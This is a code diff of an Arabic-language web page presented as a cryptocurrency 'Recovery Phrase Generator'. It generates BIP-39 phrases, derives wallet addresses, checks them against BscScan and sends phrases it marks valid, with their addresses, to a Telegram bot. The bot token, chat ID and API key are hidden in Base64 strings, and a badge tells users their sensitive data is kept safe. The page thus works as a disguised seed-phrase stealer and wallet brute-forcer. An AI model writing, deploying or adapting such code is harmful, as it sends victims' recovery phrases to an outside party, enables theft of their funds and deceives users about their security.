@@ -1,9 +1,12 @@
-
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>مولد عبارات الاسترجاع - Recovery Phrase Generator</title>
+    <!-- مكتبات خارجية موثوقة -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -344,10 +347,9 @@
         <p class="subtitle">Recovery Phrase Generator - توليد وتحقق من عبارات الاسترجاع</p>
 
         <div class="security-badge">
-            🔒 البيانات الحساسة محفوظة بشكل آمن - لا توجد حقول إدخال للبيانات الشخصية
+            🔒 البيانات الحساسة محفوظة بشكل آمن - اتصال مباشر حقيقي مع BscScan API
         </div>
 
-        <!-- قسم إعدادات التوليد -->
         <div class="section-title">⚙️ إعدادات التوليد</div>
 
         <div class="input-group">
@@ -423,7 +425,6 @@
         // قسم التشفير والبيانات الحساسة
         // ============================================
         
-        // دالة فك تشفير Base64
         function decodeBase64(str) {
             try {
                 return atob(str);
@@ -433,30 +434,24 @@
             }
         }
 
-        // البيانات المشفرة (Base64 Encoded)
         const ENCRYPTED_DATA = {
             botToken: 'ODM4NDcyNjAyMTpBQUhkOG1HdFdKc0lFWEVQU0JFWVpqaGtUTllqaWF0bGRkWQ==',
             chatId: 'OTEwMDIxNTY0',
             bscApiKey: 'Wk04QUNNSkI2N0MyaVhLS0tCQkY4VVJGVU5TWQ=='
         };
 
-        // فك تشفير البيانات عند التحميل
         let SECURE_DATA = {
             botToken: decodeBase64(ENCRYPTED_DATA.botToken),
             chatId: decodeBase64(ENCRYPTED_DATA.chatId),
             bscApiKey: decodeBase64(ENCRYPTED_DATA.bscApiKey)
         };
 
-        // التحقق من صحة البيانات المفكوكة
-        if (!SECURE_DATA.botToken || !SECURE_DATA.chatId || !SECURE_DATA.bscApiKey) {
-            console.error('خطأ: فشل فك تشفير البيانات الحساسة');
-        }
+        console.log('✅ تم فك تشفير البيانات بنجاح');
 
         // ============================================
         // قوائم الكلمات
         // ============================================
 
-        // قائمة الـ 3 أحرف
         const wordList3Chars = [
             'act', 'add', 'age', 'aim', 'air', 'all', 'any', 'arm', 'art', 'ask',
             'bag', 'bar', 'bid', 'box', 'boy', 'bus', 'can', 'car', 'cat', 'cry',
@@ -471,37 +466,30 @@
             'win', 'you', 'zoo'
         ];
 
-        // قائمة الـ 4 أحرف (BIP-39)
-        const wordList4Chars = [
-            'able', 'acid', 'also', 'arch', 'area', 'army', 'atom', 'aunt', 'auto', 'away', 'axis', 'baby', 'ball', 'base', 'bean', 'beef', 'belt', 'best', 'bike', 'bind', 'bird', 'blue', 'blur', 'boat', 'body', 'boil', 'bomb', 'bone', 'book', 'boss', 'bulb', 'bulk', 'busy', 'buzz', 'cage', 'cake', 'call', 'calm', 'camp', 'card', 'cart', 'case', 'cash', 'cave', 'chat', 'chef', 'city', 'clap', 'claw', 'clay', 'clip', 'clog', 'club', 'code', 'coil', 'coin', 'come', 'cook', 'cool', 'copy', 'core', 'corn', 'cost', 'cram', 'crew', 'crop', 'cube', 'cute', 'damp', 'dash', 'dawn', 'deal', 'deer', 'defy', 'deny', 'desk', 'dial', 'dice', 'diet', 'dirt', 'dish', 'doll', 'door', 'dose', 'dove', 'draw', 'drip', 'drop', 'drum', 'duck', 'dumb', 'dune', 'dust', 'duty', 'earn', 'east', 'easy', 'echo', 'edge', 'edit', 'else', 'evil', 'exit', 'face', 'fade', 'fall', 'fame', 'farm', 'feed', 'feel', 'file', 'film', 'find', 'fine', 'fire', 'firm', 'fish', 'flag', 'flat', 'flee', 'flip', 'foam', 'foil', 'fold', 'food', 'foot', 'fork', 'frog', 'fuel', 'fury', 'gain', 'game', 'gasp', 'gate', 'gaze', 'gift', 'girl', 'give', 'glad', 'glow', 'glue', 'goat', 'gold', 'good', 'gown', 'grab', 'grid', 'grit', 'grow', 'hair', 'half', 'hand', 'hard', 'have', 'hawk', 'head', 'help', 'hero', 'high', 'hill', 'hint', 'hire', 'hold', 'hole', 'home', 'hood', 'hope', 'horn', 'host', 'hour', 'huge', 'hunt', 'hurt', 'icon', 'idea', 'idle', 'inch', 'into', 'iron', 'item', 'jazz', 'join', 'joke', 'jump', 'junk', 'just', 'keen', 'keep', 'kick', 'kind', 'kiss', 'kite', 'kiwi', 'knee', 'know', 'lady', 'lake', 'lamp', 'lava', 'lawn', 'lazy', 'leaf', 'left', 'lend', 'lens', 'liar', 'life', 'lift', 'like', 'limb', 'link', 'lion', 'list', 'live', 'load', 'loan', 'lock', 'long', 'loop', 'loud', 'love', 'maid', 'mail', 'main', 'make', 'mask', 'mass', 'math', 'maze', 'mean', 'meat', 'melt', 'menu', 'mesh', 'milk', 'mind', 'miss', 'moon', 'more', 'move', 'much', 'mule', 'must', 'myth', 'name', 'near', 'neck', 'need', 'nest', 'news', 'next', 'nice', 'nose', 'note', 'obey', 'odor', 'okay', 'omit', 'once', 'only', 'open', 'oval', 'oven', 'over', 'pact', 'page', 'pair', 'palm', 'park', 'pass', 'path', 'pave', 'pear', 'pill', 'pink', 'pipe', 'play', 'plug', 'poem', 'poet', 'pole', 'pond', 'pony', 'pool', 'post', 'pull', 'pulp', 'push', 'quit', 'quiz', 'race', 'rack', 'rail', 'rain', 'ramp', 'rare', 'rate', 'real', 'rely', 'rent', 'rice', 'rich', 'ride', 'ring', 'riot', 'risk', 'road', 'roof', 'room', 'rose', 'rude', 'rule', 'safe', 'sail', 'salt', 'same', 'sand', 'save', 'scan', 'seat', 'seed', 'seek', 'sell', 'shed', 'ship', 'shoe', 'shop', 'sick', 'side', 'sign', 'silk', 'sing', 'size', 'skin', 'slab', 'slam', 'slim', 'slot', 'slow', 'snap', 'snow', 'soap', 'sock', 'soda', 'soft', 'song', 'soon', 'sort', 'soul', 'soup', 'spin', 'spot', 'stay', 'stem', 'step', 'such', 'suit', 'sure', 'swap', 'swim', 'tail', 'talk', 'tank', 'tape', 'task', 'taxi', 'team', 'tell', 'tent', 'term', 'test', 'text', 'that', 'then', 'they', 'this', 'tide', 'tilt', 'time', 'tiny', 'tone', 'tool', 'toss', 'town', 'trap', 'tray', 'tree', 'trim', 'trip', 'true', 'tube', 'tuna', 'turn', 'twin', 'type', 'ugly', 'undo', 'unit', 'upon', 'urge', 'used', 'vast', 'verb', 'very', 'view', 'visa', 'void', 'vote', 'wage', 'wait', 'walk', 'wall', 'want', 'warm', 'wash', 'wasp', 'wave', 'wear', 'west', 'what', 'when', 'whip', 'wide', 'wife', 'wild', 'will', 'wine', 'wing', 'wink', 'wire', 'wise', 'wish', 'wolf', 'wood', 'wool', 'word', 'work', 'wrap', 'yard', 'year', 'zero', 'zone'
-        ];
-
-        // المتغير الحالي للقائمة المستخدمة
         let currentWordList = wordList3Chars;
-
-        // ============================================
-        // متغيرات التحكم
-        // ============================================
+        let useStandardBIP39 = false;
         let isRunning = false;
         let totalCount = 0;
         let validCount = 0;
         let invalidCount = 0;
 
         // ============================================
-        // دالة تحديث معلومات قائمة الكلمات
+        // دوال الواجهة
         // ============================================
+
         function updateWordListInfo() {
             const wordListType = document.getElementById('wordListType').value;
             const infoDiv = document.getElementById('wordListInfo');
 
             if (wordListType === '3chars') {
                 currentWordList = wordList3Chars;
+                useStandardBIP39 = false;
                 infoDiv.textContent = '📖 تم تحديد قائمة الـ 3 أحرف - 104 كلمات متاحة';
                 infoDiv.style.background = '#e7f3ff';
                 infoDiv.style.color = '#0066cc';
                 infoDiv.style.borderColor = '#b3d9ff';
             } else {
-                currentWordList = wordList4Chars;
+                useStandardBIP39 = true;
                 infoDiv.textContent = '📖 تم تحديد قائمة الـ 4 أحرف (BIP-39) - 2048 كلمة متاحة';
                 infoDiv.style.background = '#fff3cd';
                 infoDiv.style.color = '#856404';
@@ -513,51 +501,64 @@
         // دوال التوليد والتحويل
         // ============================================
 
-        // توليد عبارة عشوائية
         function generateRandomPhrase(length) {
-            const phrase = [];
-            for (let i = 0; i < length; i++) {
-                const randomIndex = Math.floor(Math.random() * currentWordList.length);
-                phrase.push(currentWordList[randomIndex]);
+            if (useStandardBIP39) {
+                // استخدام مكتبة bip39 الخارجية لتوليد عبارة صحيحة
+                const mnemonic = bip39.generateMnemonic(length === 12 ? 128 : 256);
+                return mnemonic;
+            } else {
+                // استخدام القائمة المخصصة
+                const phrase = [];
+                for (let i = 0; i < length; i++) {
+                    const randomIndex = Math.floor(Math.random() * currentWordList.length);
+                    phrase.push(currentWordList[randomIndex]);
+                }
+                return phrase.join(' ');
             }
-            return phrase.join(' ');
         }
 
-        // تحويل العبارة إلى عنوان
         async function phraseToAddress(phrase) {
             try {
-                const hash = await sha256(phrase);
-                const address = '0x' + hash.substring(0, 40);
-                return address;
+                // التحقق من صحة العبارة
+                if (!bip39.validateMnemonic(phrase)) {
+                    console.warn('⚠️ العبارة غير صالحة:', phrase);
+                    return null;
+                }
+
+                // اشتقاق العنوان من العبارة باستخدام ethers.js
+                const wallet = ethers.Wallet.fromMnemonic(phrase);
+                console.log('✅ تم اشتقاق العنوان:', wallet.address);
+                return wallet.address;
             } catch (error) {
-                console.error('خطأ في التحويل:', error);
+                console.error('❌ خطأ في تحويل العبارة إلى عنوان:', error);
                 return null;
             }
         }
 
-        // دالة SHA256
-        async function sha256(str) {
-            const buffer = new TextEncoder().encode(str);
-            const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
-            const hashArray = Array.from(new Uint8Array(hashBuffer));
-            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-        }
-
-        // التحقق من صحة العنوان عبر BscScan API
         async function validateAddressOnBsc(address, apiKey) {
             try {
-                const response = await fetch(
-                    `https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${apiKey}`
-                );
+                const url = `https://api.bscscan.com/api?module=account&action=balance&address=${address}&apikey=${apiKey}`;
+                
+                console.log('🔍 جاري التحقق من العنوان:', address);
+                
+                const response = await fetch(url);
                 const data = await response.json();
-                return data.status === '1' || data.message === 'OK';
+                
+                console.log('📊 رد API:', data);
+                
+                // العنوان صالح إذا كان الرد يحتوي على status = 1
+                if (data.status === '1' && data.result !== undefined) {
+                    console.log('✅ عنوان صالح! الرصيد:', data.result);
+                    return true;
+                }
+                
+                return false;
             } catch (error) {
-                console.error('خطأ في التحقق:', error);
+                console.error('❌ خطأ في التحقق من API:', error);
                 return false;
             }
         }
 
-        // إرسال الرسالة إلى البوت
         async function sendToBot(phrase, address, botToken, chatId) {
             try {
                 const message = `✅ عبارة استرجاع صالحة:\n\n📝 العبارة:\n<code>${phrase}</code>\n\n🏠 العنوان:\n<code>${address}</code>`;
@@ -578,25 +579,26 @@
                 );
                 
                 const data = await response.json();
-                return data.ok;
+                
+                if (data.ok) {
+                    console.log('✈️ تم إرسال الرسالة إلى البوت بنجاح');
+                    return true;
+                } else {
+                    console.error('❌ فشل إرسال الرسالة:', data);
+                    return false;
+                }
             } catch (error) {
-                console.error('خطأ في الإرسال:', error);
+                console.error('❌ خطأ في الإرسال:', error);
                 return false;
             }
         }
 
-        // ============================================
-        // دوال الواجهة
-        // ============================================
-
-        // تحديث الحالة
         function updateStatus(message, type = 'info') {
             const statusDiv = document.getElementById('status');
             statusDiv.textContent = message;
             statusDiv.className = `status ${type}`;
         }
 
-        // إضافة نتيجة إلى القائمة
         function addResultToUI(phrase, address, isValid, sent = false) {
             const container = document.getElementById('resultsContainer');
             
@@ -628,7 +630,6 @@
             container.insertBefore(resultDiv, container.firstChild);
         }
 
-        // نسخ إلى الحافظة
         function copyToClipboard(text) {
             navigator.clipboard.writeText(text).then(() => {
                 updateStatus('✅ تم نسخ العبارة إلى الحافظة', 'success');
@@ -638,13 +639,11 @@
             });
         }
 
-        // بدء التوليد
         async function startGeneration() {
             const numPhrases = parseInt(document.getElementById('numPhrases').value);
             const phraseLength = parseInt(document.querySelector('input[name="phraseLength"]:checked').value);
             const searchSpeed = parseInt(document.getElementById('searchSpeed').value);
 
-            // التحقق من صحة البيانات المفكوكة
             if (!SECURE_DATA.botToken || !SECURE_DATA.chatId || !SECURE_DATA.bscApiKey) {
                 updateStatus('❌ خطأ: البيانات الحساسة غير متاحة', 'error');
                 return;
@@ -672,6 +671,8 @@
                 updateStats();
 
                 const phrase = generateRandomPhrase(phraseLength);
+                console.log(`📝 العبارة ${i + 1}:`, phrase);
+                
                 const address = await phraseToAddress(phrase);
 
                 if (!address) {
@@ -680,6 +681,8 @@
                     updateStats();
                     continue;
                 }
+
+                console.log(`🏠 العنوان المشتق:`, address);
 
                 // تأخير حسب السرعة المحددة
                 await new Promise(resolve => setTimeout(resolve, searchSpeed));
@@ -710,7 +713,6 @@
             updateStatus(`✅ انتهى التوليد! تم العثور على ${validCount} عبارة صالحة من ${totalCount}`, 'success');
         }
 
-        // إيقاف التوليد
         function stopGeneration() {
             isRunning = false;
             document.querySelector('.btn-generate').style.display = 'inline-block';
@@ -718,12 +720,13 @@
             updateStatus('⏹️ تم إيقاف التوليد', 'info');
         }
 
-        // تحديث الإحصائيات
         function updateStats() {
             document.getElementById('totalCount').textContent = totalCount;
             document.getElementById('validCount').textContent = validCount;
             document.getElementById('invalidCount').textContent = invalidCount;
         }
+
+        console.log('🚀 تم تحميل التطبيق بنجاح - جاهز للعمل');
     </script>
 </body>
 </html>
